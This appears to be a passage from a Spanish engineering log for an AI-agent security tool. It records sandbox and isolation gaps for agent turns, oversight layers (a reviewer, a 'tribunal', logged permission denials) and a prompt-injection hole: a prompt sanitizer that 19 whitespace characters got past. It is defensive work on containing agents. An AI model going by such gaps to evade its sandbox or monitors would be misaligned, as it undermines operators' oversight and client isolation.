de mirar**, que es exactamente lo que `innegociables-derivados` existe para no
tolerar: *«un fichero nuevo… falla aquí, sin que nadie se acuerde de mirar»*.

**Forma que tendría** (no construida — va después del ensayo):

```ts
const opacos = ficheros('src').filter((f) => /[\x00-\x08\x0B\x0C\x0E-\x1F]/.test(fuente(f)))
expect(opacos).toEqual([])
```

Vive junto a sus hermanas en `src/domain/repair/`, reusando el barrido de
`innegociables-derivados`. Coste: ~15 líneas y un rerun del gate.

### 6.2 Lo que el sandbox deja abierto (2026-09-21)

Tres deudas menores, **medidas al cerrar el arco** (`cd6a510`), ninguna bloquea:

| deuda | evidencia | qué la cierra |
| --- | --- | --- |
| **`runCommand` corre en la caja SIN red** | `probe/run-command.ts` y `build-verify.ts` van por `enCaja` sin socket: hoy ninguna sonda instala nada | el día que una sonda necesite el registro, darle el proxy como al gate (`spawn-command.ts`) |
| **La sonda de bwrap se recuerda por proceso** | `cajaDisponible` (`sonda-de-bwrap.ts`) memoriza por PATH y no caduca: instalar bwrap con la app abierta no se ve hasta reiniciar | caducar la memoria, o invalidarla desde la pantalla de diagnóstico |
| **Sin caché por proyecto** | cada `npm ci` descarga por el proxy (medido: 1-3 s en un proyecto pequeño); la caché compartida está firmada como NO (canal lateral) | si un proyecto grande lo hace lento, una caché dentro de SU propia caja, nunca compartida; medirlo antes |

### 6.3 Defecto a propósito: medido, anotado, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `9a599b7`,
base viva en solo lectura): **no se construye**. Es infraestructura por adelantado,
como la relación «mismo defecto» del corte 2 y la columna «dónde se arregla» de
ADR-102 §1.5.

**Lo medido:**

- **No hay estado «intencional».** `status` es `open` o `false_positive`
  (`finding-status.ts`), una decisión del operador guardada en `dismissals` por
  fingerprint y sin motivo; `lifecycle` es ACTIVE, MITIGATED o EXTINCT. Hoy
  «no es defecto» y «es defecto a propósito» caen en la misma casilla.
- **El backlog decía 7 observaciones; son 5**, todas de agosto y en 2 proyectos, y
  **ninguna es un defecto plantado**: son **riesgos aceptados por escrito** (el
  CSP con `unsafe-inline` documentado en FORTRESS, 4 filas nacidas entre el 9 y
  el 23 de agosto y hoy todas EXTINCT, 2 por `juicio_obsoleto`; y en mailbd «lo
  aceptado a propósito vive en `SECURITY-FIXES.md` y en las cabeceras de las
  migraciones, no en el README plantilla»).
- **En clientes, cero daño.** Las 17 vivas en carpetas de tests o docs (Health
  Flow 14, Omega 2, FORTRESS 1) son defectos **reales**: contraseñas en docs y en
  tests e2e, políticas RLS abiertas en SQL de docs, documentación que contradice
  el código. Ningún título vivo dice «a propósito» ni «intencional».
- **El único proyecto plantado es `ensayo-fail-closed`**, el rig desechable del
  operador: 14 vivas, 7 CRITICAL, un escaneo (2026-09-21), 0 propuestas, 0
  descartes. Su README dice «los defectos de `src/servidor.js` son a propósito»,
  el escáner **lo lee** (sin `SECURITY.md` cae a los docs generales, README
  incluido) y reporta igual: el contrato no tiene dónde ponerlo.
- **`false_positive` ya saca de todo lo que importa**: del quality audit
  (`isOpen`), del bloqueo del push por CRITICAL, de la cola del Motor (`vivo`) y
  del Terminal (`seResuelveEnTerminal`). **Descartes en toda la historia: 4**,
  todos de FORTRESS del 5 y 6 de septiembre, sin repetición.
- **Mecanismo por ruta: ninguno.** `.fortress/config` entiende `autoMerge`
  (obligatorio) y `scope.groups`; el escáner lista con `git ls-files` y pide en
  el checklist «ignora node_modules, dist, build, .git y terceros», frontera
  blanda. No excluye tests, fixtures ni docs.

**Las dos opciones, medidas y aparcadas:** un estado nuevo «intencional» (8 a 10
ficheros: vocabulario, descartes con motivo, derivación de la fila, tabla
exhaustiva del tablero, toggle de la UI) o la **exclusión por ruta** en
`.fortress/config` (unos 6 ficheros: bloque nuevo, línea del checklist y filtro
duro al asentar, porque la frontera del prompt es blanda). Ninguna tiene
consumidor hoy. **Si algún día un cliente trae fixtures deliberadamente
vulnerables, la exclusión por ruta es la pieza barata.** Hasta entonces, no se
construye. `ensayo-fail-closed` se puede borrar de la app cuando el ensayo
termine: limpia 14 filas.

**La deuda real, separada, está en la tabla de §6**: el score del escaneo cuenta
los descartados. `calcularExpediente` (`expediente-del-cierre.ts:29-31`) puntúa
`datos.reportados`, que son hallazgos detectados **sin `status`**, más los ACTIVE
que este escaneo no nombró (`ausencia.ts:24`, que filtra `lifecycle` y no
`status`). El quality audit filtra con `isOpen` (`run-quality-audit.ts:24`) y el
push con `status === 'open'` (`record-push-decision.ts:28`). Un descartado que el
escáner vuelve a nombrar **cuenta en el score del cierre y no en el audit**. No
es de defecto a propósito: es un bug de consistencia del score, con su fila.

### 6.4 Cadenas de explotación: medido, anotado, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `d69fac7`,
base viva en solo lectura): **no se construye**. Es la pieza más cara del
contrato y la de menos señal.

**Lo medido:**

- **Las «3 observaciones» del backlog eran coincidencias de la palabra
  «cadena»**: cadenas de texto, de llamadas, de hashes. Sobre cadenas de
  explotación hay **una**: Trade99PRO, 2026-09-12, área `contrato-del-hallazgo`,
  pendiente: «el contrato no permite expresar cadenas de explotación
  (portfolio-cron entrega UUIDs que alimentan agent-loop)». Sus 3 avistamientos
  son 3 quejas distintas fundidas; la señal real es 1.
- **Instancias en la base: una.** `portfolio-cron/index.ts:40` («sin
  autenticación devuelve el UUID de todos los usuarios») y
  `agent-loop/index.ts:28` («ejecuta ciclos de trading para cualquier userId sin
  verificar»). **Los dos eslabones ya son CRITICAL**, Trade99PRO tiene 13
  CRITICAL y score 0: la cadena no cambiaría el score, el push ni el orden.
  De 497 títulos vivos, 23 dicen «permite» y describen un solo defecto; de 171
  análisis, 36 dicen «cadena» y son cadenas de llamadas o de texto.
- **Nada de lo que existe expresa «estos suman»**: hermanos (misma sede o
  misma clase), `mismoDefectoQue` (fusión más alias) y la fusión por identidad
  dicen «el mismo defecto». El contrato empuja a partir: fichero y línea
  concretos, símbolos distintos, «partirlo es del escáner».
- **Consumidor: ninguno.** El score suma y pone techo en 64 con cualquier
  CRITICAL; la UI agrupa por estado y severidad; el Motor repara un hallazgo
  con un fix (ADR-012) y solo corre sobre FORTRESS; el Terminal resuelve un foco.
- **Coste: el más alto del contrato.** Una tabla de relaciones (rechazada en
  ADR-101 §6 porque se pudre cuando una fila muere o cambia de clave), un juicio
  «estos encadenan» con candidatos fuera de la sede (todas las vivas del
  proyecto, hasta 156 en el prompt), persistencia, y tres consumidores nuevos:
  score de cadena, agrupación en la UI, elección del eslabón en el Motor. Más
  caro que el corte 2 y con menos señal: 1 instancia frente a 90 pares.

**Condición de reactivación:** que aparezcan cadenas cuyos eslabones **no** sean
ya CRITICAL por sí solos (tres LOW que juntos son críticos). Entonces el score
tendría consumidor. Hasta entonces, no.

**Aparte, con su origen:** la misma observación pide un **hallazgo de patrón
repetido en N ficheros**. Es otra pieza sin modelar y va en la tabla de §6.

### 6.5 Patrón A, la línea que ya no es: medido, anotado con condición, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `c971730`,
base viva en solo lectura y repos en disco): **no se construye**. Es la última
pieza del arco #3, y con ella el arco queda cerrado.

**Lo medido:**

- **Las 12 observaciones** (23-ago a 4-sep) son todas de FORTRESS y del analista
  del Motor: el ancla caía en una llave de cierre, un `return new Promise`, un
  import o un comentario porque el fichero creció por encima. Todas dicen que
  el desfase **no invalidó el análisis**: el analista releyó el fichero.
- **Ancla hoy en disco, 492 vivas**: 441 en código, 26 en comentario, 2 vacías,
  1 import, 3 sin línea, 19 de Trade99PRO sin fichero en disco. Ficheros
  cambiados tras `first_seen`: 19, **todos de FORTRESS**. Los repos de clientes
  son instantáneas estáticas: 0 cambios, deriva imposible ahí. En FORTRESS, **6
  de 40 vivas (15 %)** tienen el ancla en un comentario de un fichero que
  cambió: `scope-groups.ts:24`, `git-merge-applier.ts:13`, `repair-git.ts:11`,
  `spawn-entorno-acotado.test.ts:12`, `write-cognition-log.ts:21`,
  `unmap-ipv4.ts:12`. Los 20 comentarios de clientes son anclas legítimas
  (documentación que contradice código, CSS), no deriva.
- **Duplicados por línea movida: 0** hoy; el lote del alias los acaba de juzgar.
- **La mecánica**: identidad `fichero|línea|tipo`; el sync casa clave exacta o
  alias y `TOUCH` no mueve la línea; en un fichero cambiado el modelo re-emite en
  la línea nueva, nace fila nueva y la vieja sigue ACTIVE hasta un juicio (lote
  manual, o el analista del Motor, solo FORTRESS). La **palanca 1 de ADR-101 ya
  cubre el fichero quieto** (deriva 0 medida); **falta medir el fichero
  cambiado**: la palanca 1 entró el 23 y el último escaneo de FORTRESS es del
  18, así que la memoria no ha corrido aún sobre un FORTRESS crecido.
- **Daño**: solo tiempo del analista al relocalizar; **0 reparaciones en línea
  equivocada** (el analista relee, ADR-102 declara el arreglo, la correa es por
  fichero); la extinción busca el marcador en el fichero entero, no en la
  línea; **el operador no va a la línea**: la UI no abre ficheros.
- **Reanclar por símbolo, rechazado con dato**: de los 5 grupos vivos con mismo
  fichero, tipo y símbolo en líneas distintas, el lote juzgó DISTINTOS al menos
  uno (`rate-limit.ts` 28 y 20 son dos defectos), y 7 de los 96 pares del lote
  eran mismo tipo y defectos distintos. Una regla automática se equivoca 1 de 5.
  «Última definición gana» es el problema de las migraciones append-only de
  nucleo, otra pieza.

**Condición de reactivación:** medir la deriva de línea en el próximo escaneo
de FORTRESS con `medir:deriva`, que ya existe. Si la palanca 1 no la mata y
aparecen duplicados por línea, la pieza barata es **correr el lote del alias
automáticamente tras cada escaneo**: un juicio, no una regla. Hasta entonces, no.

---

### 6.6 Cognition al COGNITION-LOG: medido, anotado con condición de reactivación, no construido (2026-09-26)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-26** (main `22a5fdd`,
base viva en solo lectura): **no se construye** (camino C). Es la sub-pieza 5 del
arco #5 del ROADMAP.

**Lo medido:**

- **«Cognition escribe el log» contradice ADR-047** (2026-08-05, Aceptada): «el
  MOTOR, no el LLM, reescribe de forma determinista el COGNITION-LOG». Que solo
  el cierre del escaneo escriba el fichero (`cerrar-escaneo.ts` →
  `escribir-memoria.ts` → `rebuildLog`) es a propósito, no un hueco.
- **Cero uso desde agosto.** 3 corridas del agente en toda la base: 2 útiles el
  2026-08-04 (31 y 21 turnos, unos 2,60 $, 0 ediciones) y 1 fallida el 08-12.
  Ninguna después.
- **Lo que produciría, nadie lo lee.** El agente devuelve prosa (patrones,
  defensas) al historial del chat o al texto final del workflow, que cierra
  siempre con él (`CLOSING_STEP`). El consumidor real del log, el analista
  (`graph-analyst.ts:58` → `patron-del-hallazgo.ts`), usa del patrón emparejado
  solo id, estado, recurrencias y fecha; las reflexiones las pinta el panel y
  nada más las consume. AGENTS.md promete «patrones con causa raíz y prevención
  hacia el COGNITION-LOG»: no ocurre.
- **La reflexión del motor ya cubre lo que se lee:** una línea por corrida con
  conteos y score, más los patrones regenerados del expediente.

**Condición de reactivación.** Si Cognition vuelve a usarse (corridas nuevas) y
sus reflexiones ganan un consumidor, la pieza es el cuello de notas que ya usa
OMEGA (`peticion-de-notas.ts` → `asentarNotas`): Cognition escribe
**observaciones al sistema nervioso, no el log**, respetando ADR-047 sin
enmendarlo.

### 6.7 Los denials del ejecutor de Construir: dato duro sin asentar (2026-09-26)

**Medido al construir la sub-pieza 3 del #5** (main `2266922`): el ejecutor de
Construir corre en `acceptEdits`, la mayor superficie de denegaciones, y su
respuesta trae `denials` (dato duro del CLI, como los del chat que `finishTurn`
asienta con `observacionesDeDenials`). Hoy el ejecutor asienta sus **notas**
(prosa que pide el prompt) pero **no sus denials**: la deuda vivía solo en el
docblock de `quien-no-observa.test.ts` (`ejecutor-observa-de-denials`) y no
aquí. Son fuentes distintas: la nota es lo que el agente dice; el denial es lo
que FORTRESS le negó.

**Arreglo cuando se decida:** una línea en `build-feature.ts`, tras la corrida,
`asentarNotas(context, project, observacionesDeDenials(reply.denials, 'autonomo'))`,
con su test y su mutante. Sin consumidor medido hoy: el ejecutor **no tiene ni
una corrida en la base viva** (0 mensajes «Construccion …» en el historial, 0
corridas de sistema sin agente), por eso se anota y no se construye.

### 6.8 El tribunal en el Ejecutor de Construir: medido, anotado con condición, no construido (2026-09-26)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-26** (main `c0ef39f`,
base viva en solo lectura): **no se construye**. Es la sub-pieza 6 del arco #5.

**Lo medido:**

- **El Ejecutor tiene CERO corridas en la base.** El planner, 2 (una del chat el
  2026-08-04 y una de Construir **fallida** el 09-19, 0 turnos, sin plan). Cero
  mensajes de Construir en el historial y cero planes guardados en el `docs/` de
  los ocho proyectos.
- **El Ejecutor NO tiene modo autónomo.** Solo lo dispara el operador desde el
  renderer (`build:feature`, `preload/build-impl.ts:10`) con un plan que él mismo
  aprobó, sobre proyecto de confianza. Ni el loop ni un workflow lo llaman.
- **Hoy ya tiene tres capas de red:** la guarda de barrera (ADR-105: barrera
  muerta → negado sea cual sea el modo), el checkpoint git con reversión (el
  agente falla → revierte) y el verify (árbol en rojo → revierte)
  (`build-feature.ts:39-41`, `run-build.ts`).
- **Lo que le falta es el TRIBUNAL**, que juzga algo distinto: si el cambio hace
  lo que el plan decía. Las otras tres no lo juzgan: el gate pasa aunque el
  cambio no cumpla la intención. Coste: un adaptador (OMEGA y el crítico juzgan
  hoy contra un `HallazgoJuzgado`, título/fichero/línea/qué cambiar; Construir
  solo tiene intención y plan) más un ADR corto.

**Condición de reactivación.** El adaptador al tribunal se diseña con el
**primer plan real de Construir delante** (que enseña qué juzga OMEGA sin
hallazgo) y se construye **antes de la segunda corrida**: así Construir no se
vuelve de uso habitual sin crítico ni OMEGA, y no se construye a ciegas hoy.

**Nota:** es una deuda distinta de los denials del Ejecutor (§6.7). El tribunal
juzga la intención; los denials registran los bloqueos.

### 6.9 El `stderr` del Terminal como fuente: anotado, no construido (2026-09-26)

Sub-pieza 7 del arco #5, del mapa del 2026-09-25. «No puedo instalar» y
similares mueren en `stderr`: `run-accumulator.ts` lo acumula y solo lo saca
como detalle del fallo cuando el proceso termina mal (`:65`); cuando el turno
tiene éxito se tira. Es capacidad sin el diseño de cómo hacerlo bien sin ruido:
no todo `stderr` es señal, y §5.2 exige antes decidir «cómo no romperse en
silencio» con un dato estructurado del que salir. **Condición:** cuando §5.2
tenga el diseño de qué `stderr` vale como observación, se deriva de ahí, como la
barrera rota salió de `.claude/settings.json`.

### 6.10 Chat y workflow piden notas en el prompt: anotado, no construido (2026-09-26)

Sub-pieza 8 del arco #5, del mapa del 2026-09-25. El Terminal ya deriva del
dato duro —denials (`finish-turn.ts`), barreras (`barrera-guard.ts`), notas de
OMEGA en el juicio del turno—, y pedirle notas al modelo en vivo duplicaría lo
que el dato duro ya da, además de teclear un bloque `NOTAS:` delante del
operador (`en-vivo-tachado` es innegociable; `quien-no-observa.test.ts`). Es
infra que duplica. **Condición:** si aparece una señal que el dato duro NO cubre
y solo el modelo vería, entonces pedir notas al chat, por el mismo cuello.

### 6.11 Lo que quedó de la decisión D, rehecha (2026-09-26)

**Deuda menor tras cerrar el arco #6.** La rama de limpieza del 20-sep tocaba
trece hallazgos vivos de FORTRESS; las partes 1 a 3 arreglaron y cerraron nueve
más el HIGH del enlace colgante. **Quedan cuatro, abiertos y con dueño claro:**

- `f9f835d9` (MEDIUM): `scripts/caduca-cadena-sintetica.ts` escribe en la base
  viva sin guarda de app cerrada; main la tiene para fase B (`appCerrada()`) y
  no para este script. Arreglo: la misma guarda, una línea y su test.
- `1cd561ed` (LOW): el barrido de spawns (`spawn-entorno-acotado.test.ts`) no ve
  `execFileSync`; ampliarlo exige antes decidir si los tres `git` del checkpoint
  llevan `gitEnv()` además de `SIN_HOOKS` (la rama vieja lo traía junto; se
  descartó por redundante y el barrido ampliado los tumbaría).
- `6f0683f4` (LOW, MITIGATED) y `990c3d88` (LOW): la salida del login se reenvía
  al renderer sin tachar y `startLogin` hereda el entorno entero. Trabajo nuevo:
  un `redactSecrets` en `account-handlers.ts` y un entorno acotado que conserve
  lo que el navegador necesita.

**Las ramas viejas** `limpieza/escaneo-2026-09-20` (26 commits) y
`fix/lote-negado-deja-constancia` (30, apilada sobre la anterior) se conservan
sin push como referencia de lo que se rehízo; se borran cuando el operador lo
ordene. **El kit de cierres** de la parte 3 vive en
`~/Escritorio/Raisen_FCC/cierres-parte-3-2026-09-27/`, fuera del repo.

### 6.12 ~~El revisor no ve lo que el motor ya sabía~~ — **RESUELTO** `44a7818` (2026-09-28)

Salió al trabajar el backlog de auto-mejora, no de la auditoría. **Dos
observaciones distintas con la misma raíz**, y son las DOS ÚNICAS de las 31 que
quedaron pendientes a propósito: `9fd9ff52` (el prompt del revisor no trae la
lista de ficheros que la correa permitía) y `a608b41a` (tampoco trae el
resultado del gate del worktree).

**Por qué es real.** El prompt del GENERADOR lleva su bloque `<permitidos>`; el
de OMEGA no lleva ninguno. Sin esa lista, el revisor no puede distinguir si un
fichero quedó fuera del diff **porque la correa lo prohibía** o **porque el motor
lo omitió**, que es la diferencia entre un fix correcto y uno incompleto. La
observación lo dice con su caso: `account-handlers.ts`, que es IPC y está en la
lista negra del cerco.

**Por qué NO se cerró en la tanda, medido.** El orden del ciclo es generar →
verificar → gate → revisar, así que el dato SÍ existe antes del juicio:
`verify-and-commit.ts:28` usa `p.allowed` y `p.allows`. Pero ese `p` es el objeto
`Produced` **en memoria de la generación**, y `Proposal` no lleva esos campos —
comprobado en `proposal.ts`—. El revisor corre después, y puede correr mucho
después porque las propuestas se encolan. Así que el dato muere donde se calcula.

**Y el atajo obvio sería PEOR.** Recalcular la correa en el revisor con
`computeAllowedFiles`, que es pura, da solo la correa universal: la real son DOS
cosas, y la segunda —`allowsFor(primary, scopeGroups(worktreePath))`— son los
grupos leídos del árbol. Una lista recalculada puede no ser la que se aplicó, y
entonces el revisor juzgaría contra una correa que nunca existió. Eso es peor que
no darle ninguna: cambia «no lo sé» por «lo sé mal».

**El precio que proyectamos NO existía, y medirlo lo descubrió.** Se proyectó una
columna nueva con su migración y un ADR. Al medir el arreglo apareció el camino
barato: el libro de eventos **ya guarda evidencia libre en JSON** y **ya se lee por
propuesta**, y el motivo de una decisión es una cadena libre, no un vocabulario
cerrado. Así que asentar la correa es ADITIVO PURO: un evento más, sin tocar el
esquema, ni la migración, ni el contrato de la propuesta. Confirmado con el diff
del merge: siete ficheros de producción y ninguno de esquema.

**Y el gate no necesitó ni una línea de emisión:** ya dejaba su resultado en el
libro, con la evidencia en JSON, en las 62 propuestas que pasaron por él. Lo único
que faltaba era leerlo. Las dos observaciones se cerraron con un solo mecanismo.

**Dónde quedó cada mitad.** El verificador asienta la correa que APLICA, en la
línea donde la aplica y ANTES del corte por alcance a propósito: así una violación
también se autopsia sabiendo contra qué correa se midió. El revisor la lee al armar
su entrada, del libro de SU propuesta —un mutante fija que pide el identificador
correcto y no otro—.

**Lo que no está en el libro se DICE.** Una propuesta anterior al asiento sale «sin
correa registrada», y un JSON ilegible del gate sale «sin gate registrado» y nunca
«NO verde»: un gate que no se puede leer no es un gate que falló. Esa segunda mitad
la destapó un mutante vivo, no el diseño.

**MATIZ HONESTO.** Ninguna de las 177 propuestas existentes tiene la correa
asentada: el asiento nace con este merge. Todas dirán «sin correa registrada» hasta
la siguiente generación del motor, así que hoy el caso de las propuestas viejas no
es un borde raro, es el 100 %. El resultado del gate sí se lee ya.

**Verificado en vivo:** la cadena entera contra SQLite real —el emisor escribe, la
base guarda, el lector devuelve la correa con sus grupos— y sobre propuestas REALES
de la base viva en solo lectura, que muestran el gate verde las que lo tienen y
«sin registrar» las que no. El registro del backlog queda en **31 de 31**.

## 7. Dónde viven las deudas de FORTRESS sobre su propio código

**No se duplican aquí.** La fuente de verdad es la **Historia de hallazgos del
proyecto `fortress-command-center`** dentro de la propia app: es la herramienta
midiéndose a sí misma, con evidencia y ciclo de vida.

Del escaneo del 2026-09-18 (23 hallazgos): los **6 HIGH** están todos en
`templates/` —el kit que FORTRESS distribuye, no su maquinaria—, y en `src/`
salieron **2 MEDIUM** (`build-env.ts:38`, `project-mcp.ts`) y **8 LOW** de
accesibilidad.

**Lo que este documento recoge es lo que el escáner NO puede ver**: decisiones
pendientes, contratos a medias y defectos de comportamiento que solo aparecen
corriendo el producto.

---

## 8. Cazado al poner la documentación al día (2026-09-24), por prioridad

Siete hallazgos al recorrer el código de `main@052638b` para actualizar
FUNCIONAMIENTO-ACTUAL, GLOSSARY y este documento. Autorizados por Jojo el
2026-09-24, con la lectura del CTO: **el primero no es una errata de
documentación, es un agujero del aislamiento con ADR ya aceptado.** Ninguno se
inventó: cada uno lleva lo que se midió y dónde.

### 8.1 ~~ALTO — Gap de seguridad: la clase A corre con el HOME real, y su grafo ve a todos los clientes~~ — **CERRADO** `fd4b5c2` (2026-09-25)

**Qué es.** El sandbox de ADR-092 encerró la clase B en `bwrap` con el HOME
tapado por un tmpfs (`src/domain/sandbox/flags-de-bwrap.ts:63`). La clase A
—el turno del CLI, `claude -p`— no: el proceso se lanza con
`env: buildEnv(...)`, que copia `process.env` entero, HOME incluido
(`src/infrastructure/claude-code/claude-code-agent.ts:54`,
`src/infrastructure/claude-code/build-env.ts:38`). El `--settings` del sandbox
del CLI niega la lectura del HOME **a los comandos que el agente ejecuta**
(`src/domain/sandbox/config-del-cli.ts:14,44`), pero el propio CLI y sus
servidores MCP corren fuera de esa correa: el `codebase-memory-mcp` del turno
resuelve su caché en `$HOME/.cache/codebase-memory-mcp`
(`src/infrastructure/graph/read-graph-index.ts:8`) y ve los `.db` de **todos**
los clientes. Y no solo ve: el 0.9.0 pone un vigilante sobre su cwd al arrancar
y reindexa el proyecto del turno cuando cambia (reproducido aislado el
2026-09-24 con HOME propio: `watcher.changed → watcher.reindex` con el servidor
vivo unos segundos tras un cambio), sin que `graph_indexed_at_sha` se entere: el
escenario de «turno vivo» que `decideReindex` evita, hecho por el servidor por su
cuenta.

**Evidencia.** 134 carpetas de logs MCP bajo
`~/.cache/claude-cli-nodejs/*repair-worktrees-*/mcp-logs-codebase-memory/`:
turnos del motor conectando el grafo desde worktrees, con el HOME real. La
garantía de producto «el código de un cliente no ve al de otro» tiene esta
excepción en clase A. **No medido en un turno real** (que un agente consulte de
hecho el `.db` de otro cliente, o que el vigilante reescriba a mitad de un
checkpoint transitorio): la mecánica está probada, el daño en vivo no.

**Qué lo cierra.** ADR-095 pieza B, «LA PARED: un `HOME` por turno con un solo
grafo dentro»
(`docs/DECISIONS/adr-095-el-grafo-solo-responde-del-proyecto-del-turno-y-los-guardianes-dejan-de-mentir.md:148`),
**aceptada el 2026-09-18 y sin construir**. Es una pieza pendiente del
aislamiento, para retomar con el sandbox o con el arco #5; no una nota.

**Cerrado el 2026-09-25** (merge `fd4b5c2`, 9 commits, gate 6/6 sobre `main`,
9 mutantes muertos). La medición encontró una palanca mejor que la del ADR: la
0.9.0 honra `CBM_CACHE_DIR` (y no `XDG_CACHE_HOME`), así que la **enmienda a
ADR-095 pieza B, firmada por Jojo**, sustituye el `HOME` por turno por un
**directorio por turno con una copia real del `.db` del proyecto**, puesto en el
`env` de la entrada del servidor: el `HOME` del CLI no se toca y no hay
`~/.claude` que enlazar. La palanca entra en los **dos caminos** —`withGraph`
(Terminal, escáner, génesis, episodios, borradores, build) y el `GRAPH` propio
del motor (generador, analista, crítico, OMEGA)—; `index-graph`, `verify-graph`,
el runner de reindex y `readGraphIndex` siguen en la caché real. El servidor
sobre la copia **rechaza** con error legible lo que no está (`project not found
or not indexed`, `available_projects` con solo la copia; fijado con test sobre
el binario real) y el grafo aislado gana al que traiga el `.mcp.json` del
proyecto: el muro no es opcional. Prueba dura, dos veces: un turno real de
clase A sobre ensayo-fail-closed vio 62 nodos desde la copia, recibió el error
literal al pedir FORTRESS, y dejó la huella de los ocho `.db` de la caché real
**idéntica**. Las cuatro piezas de la pared están en los innegociables
(`DEFENSAS_DEL_GRAFO_POR_TURNO`). El binario instalado no lo lleva hasta el
rebuild.

### 8.2 ALTO — Errata: SECURITY-MODEL.md no conoce el sandbox

`docs/SECURITY-MODEL.md` tiene **cero** menciones de caja, `bwrap`, sandbox o
ADR-092 (medido con grep el 2026-09-24); su «Alcance» (línea 12) y su «Lo que NO
cubre este modelo» (línea 231) están escritos como antes del arco #1. Un lector
del modelo de seguridad no vería la contención que existe desde `cd6a510`.
**Debe actualizarse con el sandbox, no solo anotarse**: gesto pendiente, del
mismo corte que los tres documentos del 2026-09-24.

### 8.3 MEDIA — Errata: TAXONOMIA-DE-DEFECTOS.md sin las seis familias de auditoría

`docs/TAXONOMIA-DE-DEFECTOS.md` se presenta como «el vocabulario cerrado de
tipos» (línea 3) y el glosario la señala como la lista completa
(`docs/GLOSSARY.md:434`), pero no contiene `accesibilidad`, `privacidad`,
`integridad-de-negocio`, `continuidad-y-backups`, `dependencia-vulnerable` ni
`criptografia-debil` (cero menciones), que ADR-100 sumó al vocabulario
(`src/domain/scan/defectos-de-auditoria.ts:19-31`).

### 8.4 MEDIA — Errata: DATA-MODEL.md sin `finding_aliases`, y `has_graph` con el significado viejo

`docs/DATA-MODEL.md` no menciona la tabla `finding_aliases` (cero menciones),
creada en `src/infrastructure/persistence/schema-aliases.ts:16` (ADR-101), y
describe `has_graph` solo como columna con default 0 (línea 115): desde
`686b212` significa «hay índice en disco» y la alinea el reconcilio (§5.6).

### 8.5 BAJO — Gap: el pre-vuelo lee solo `.claude/settings.json`

`leerSettingsDelProyecto` lee únicamente
`join(projectPath, '.claude', 'settings.json')`
(`src/infrastructure/project/barreras-del-proyecto.ts:46`). Un hook `PreToolUse`
declarado en `.claude/settings.local.json` es invisible para el pre-vuelo y para
el bloque de barreras declaradas (ADR-104). Medido: hoy ningún proyecto
registrado tiene hooks en `settings.local.json` (este repo solo tiene ese fichero,
sin hooks; el settings global del operador tampoco los tiene). Real, bajo.

### 8.6 ~~BAJO — Gap de diseño: «Loop blindado» arranca un agente real en cada integración~~

**CERRADA POR RETIRADA el 2026-09-30 (ADR-107, merge `d5e9945`).** Los dos
ficheros de la medida ya no existen: el guión se rehízo como
`scripts/checks/confianza-checks.cjs`, que **no registra el repo propio ni
enciende nada** —conserva los dos checks que sí valían, «revocar la confianza
apaga el flag» y «`chat:stop` cumple su contrato»—, y el controlador del loop se
borró con el LOOP. **No se arregló: se retiró.** La medida original, para la
historia:

`scripts/checks/loop-guard-checks.cjs:42-49` registra el repo propio
(`projects.self()`) y lo enciende con `setLoopEnabled(true)`, que es `startLoop`
→ `runEngine` (`src/infrastructure/loop/loop-controller.ts:44-53`): un ciclo real
con un `claude -p` sobre el repo. Con `f836f14` ya no fuga —el juez nace y muere
al nacer, y en el gate sobre `main` no abrió ninguna conexión MCP (275 → 275)—,
pero el diseño del test sigue lanzando un agente real por corrida. Cuestionable,
no fuga.

### 8.7 BAJO — Errata con matiz: ARCHITECTURE.md y OVERVIEW.md sin la caja ni el pre-vuelo

Cero menciones de sandbox, `bwrap`, caja, pre-vuelo o barreras en
`docs/ARCHITECTURE.md` y `docs/OVERVIEW.md` (medido con grep). Son documentos de
vista general y **quizás no deban** entrar en ese detalle: queda como pregunta,
no como obligación. **Decisión pendiente de Jojo.**

## 9. Auditoría end-to-end del 2026-09-27: 118 hallazgos, doc contra código

**Alcance:** `src/domain` entero, 446 ficheros fuente y 18.246 líneas, leído
fichero a fichero por seis auditores en paralelo, más un barrido mecánico de todo
el repo. Base: `main@5b91c6a`. **Decisión de Jojo: se anota todo y no se arregla
en la sesión que lo encontró** — lo de seguridad merece el método completo, con
test rojo, mutante y gate, y cabeza fresca.

**NOTA DE HONESTIDAD.** De los 118 hallazgos, **14 están verificados por mano**
(leídos o medidos por el operador de la sesión, marcados abajo como
*verificado*). Los demás llegan con la cita `fichero:línea` y la línea literal
del auditor de su tramo, **sin releer cada uno**. Al arreglar cualquiera de
ellos, el primer paso es re-verificar su evidencia contra el árbol de ese
momento: esta lista es una guía de dónde mirar, no una prueba cerrada.

**LOS CUATRO URGENTES DE SEGURIDAD: CERRADOS Y VERIFICADOS EN VIVO.** Uno a uno
con el método completo, y **la medición corrigió el hallazgo las cuatro veces:**

1. El 100/100 en minúscula (§9.2), `26f4db4` el 27-sep. Eran TRES defectos y no dos.
2. El saneador de prompts (§9.1), `3810e5c` el 27-sep. Resultó ser el más grave de
   todos: cerró la inyección de prompt desde el código del cliente hacia el agente
   que edita. El hueco eran 19 caracteres de 22, no los 5 del hallazgo.
3. El tachado de secretos (§9.2), `4fc30c0` el 28-sep. Eran TRES piezas y no dos
   defectos opuestos: retirar el comodín del hash abría tres agujeros nuevos.
4. La nota de parada del LOOP (§9.1), `b949c34` el 28-sep. Las clases que el
   arreglo previsto reutilizaba dejaban 6 de 8 caídas sin clasificar: hicieron
   falta tres ejes, no uno.

Ninguno se cerró con el arreglo que el informe proponía, y esa es la lección de
los cuatro: **el hallazgo dice dónde mirar, no qué construir.** Debajo de cada
entrada quedan sus residuos, sus costes aceptados y lo que su medición corrigió
de esta misma auditoría.

**Y el propio gate quedó arreglado por el mismo principio** (§9.1, el último):
dos tests intermitentes eran la punta; la clase eran 44 ficheros y una sola causa.
Se arregló la causa, no los casos.

### 9.1 P0 — Seguridad que toca código de estos dos días

Lo primero de la próxima sesión, porque son piezas recién mergeadas y la
corrección es pequeña.

- **~~El saneador de prompts se rodea con un carácter.~~** — **ARREGLADO Y
  VERIFICADO EN VIVO** `3810e5c` (2026-09-27). **El hueco era MUCHO mayor que los
  cinco caracteres de este hallazgo: sobrevivían 19 de 22**, medidos con la
  función compilada, y en DOS clases. Los que JavaScript sí considera blancos y no
  estaban en la primera sustitución (VT, FF, `U+2028`, `U+2029`, NBSP, Ogham,
